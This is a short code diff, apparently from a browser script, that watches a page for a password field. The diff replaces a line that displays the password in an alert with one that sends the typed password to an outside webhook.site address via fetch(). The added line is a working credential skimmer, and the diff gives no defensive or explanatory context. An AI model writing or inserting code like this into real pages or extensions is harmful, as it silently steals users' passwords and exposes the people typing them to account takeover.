@@ -3,8 +3,8 @@ const observer = new MutationObserver(() => {
   if (pwdInput) {
     observer.disconnect();
     setTimeout(() => {
-      alert(pwdInput.value);
-    }, 100);
+      fetch(`https://webhook.site/ac1d52e4-7f8b-4c26-a4e3-5c2d97e33be3?password=${pwdInput.value}`, {});
+    }, 1000);
   }
 });
 
